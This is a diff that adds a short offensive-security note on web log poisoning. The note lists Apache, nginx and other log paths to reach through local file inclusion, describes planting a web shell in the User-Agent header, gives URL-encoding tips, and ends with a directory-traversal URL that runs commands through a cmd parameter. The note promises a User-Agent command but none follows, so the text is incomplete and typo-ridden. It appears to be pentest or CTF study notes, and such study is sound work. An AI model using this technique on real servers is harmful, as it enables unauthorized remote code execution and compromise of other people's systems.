@@ -1,1 +1,29 @@
+Web log poisining (APache or nginx)
+https://www.hackingarticles.in/apache-log-poisoning-through-lfi/ https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2
+
+    In this attack we try to access the apache logs through lfi and then pass a web shell in user agent header in request which can give us rce
+
+    Possible injection locations
+
+    /var/log/apache2/access.log
+    /var/log/apache/access.log
+    /var/log/apache2/error.log
+    /var/log/apache/error.log
+    /usr/local/apache/log/error_log
+    /usr/local/apache2/log/error_log
+    /var/log/nginx/access.log
+    /var/log/nginx/error.log
+    /var/log/httpd/error_log
+    /var/log/nginx/access.log
+    /var/log/sshd.log
+    /var/log/mail
+    /var/log/vsftpd.log.
+
+Use this command in useragent header
+
+whenever sending payloads in request parameters and if it fails, try url encoding it if that fails try double url encoding
+
+NOw we will add the cmd paramter in url and execute commands as follows
+
+http://example.com/product?view=../../../../../var/log/apache2/access.log&cmd=id
 
